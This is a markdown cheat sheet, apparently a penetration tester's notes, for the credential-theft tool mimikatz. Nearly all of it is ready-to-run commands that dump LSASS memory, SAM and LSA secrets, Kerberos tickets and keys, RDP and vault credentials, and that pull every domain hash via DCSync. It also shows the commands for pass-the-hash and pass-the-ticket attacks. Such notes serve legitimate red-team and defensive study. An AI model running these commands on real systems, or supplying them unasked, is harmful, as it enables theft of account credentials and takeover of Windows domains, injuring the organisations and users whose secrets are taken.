# mimikatz

## Overview

 Extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets.


## Implementations

Original tool for windows:

    https://github.com/ParrotSec/mimikatz

Impacket collection of python tools implements mimikatz.py


## Usage

It is always a good idea to type "log" before running any commands in "Mimikatz" this way all command output will put output to a ".txt" file. 

    log <filename>.log

Dump a process

    sekurlsa::minidump <process_dump>   loads process dump

Retrieves credentials that are stored in the memory (RAM) for currently logged-on users. It specifically targets the LSASS (Local Security Authority Subsystem Service) process, which handles user authentication in Windows. Plaintext passwords, hashes, and Kerberos tickets for all the active user sessions. It can grab credentials from memory that are in use or recently used by the system.

    sekurlsa::logonpasswords    Searches for passwords


Extract information directly from the Local Security Authority (LSA) secrets and the Security Account Manager (SAM) database. LSA Secrets: It can pull stored passwords from the LSA, including passwords for services or cached domain credentials. SAM Hashes: You can also use this to dump user account hashes stored in the SAM database (not directly from memory like sekurlsa::logonpasswords). More focus on stored or system-wide credentials rather than just user session passwords.

    privilege::debug
    lsadump::lsa /inject

or

    privilege::debug
    sekurlsa::logonpasswords




Dump LSASS

```
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords
```

Dump and save LSASS in a file
```
mimikatz sekurlsa::minidump c:\temp\lsass.dmp
```

Pass the Hash

```
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>
```

List all available kerberos tickets in memory

```
mimikatz sekurlsa::tickets
```

Dump local Terminal Services credentials
```
mimikatz sekurlsa::tspkg
```

List cached MasterKeys
```
mimikatz sekurlsa::dpapi
```

List local Kerberos AES Keys
```
mimikatz sekurlsa::ekeys
```

Dump SAM Database
```
mimikatz lsadump::sam
```

Dump SECRETS Database
```
mimikatz lsadump::secrets
```

Inject and dump the Domain Controler's Credentials
```
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject
```

Dump the Domain's Credentials without touching DC's LSASS and also remotely
```
mimikatz lsadump::dcsync /domain:<DomainFQDN> /all
```

Dump old passwords and NTLM hashes of a user
```
mimikatz lsadump::dcsync /user:<DomainFQDN>\<user> /history
```

List and Dump local kerberos credentials
```
mimikatz kerberos::list /dump
```

Pass The Ticket
```
mimikatz kerberos::ptt <PathToKirbiFile>
```

List TS/RDP sessions
```
mimikatz ts::sessions
```

List Vault credentials
```
mimikatz vault::list
```


## Tips

Convert base64 tickets to be cracked in linux hosts:

    echo "<base64 blob>" | tr -d \\n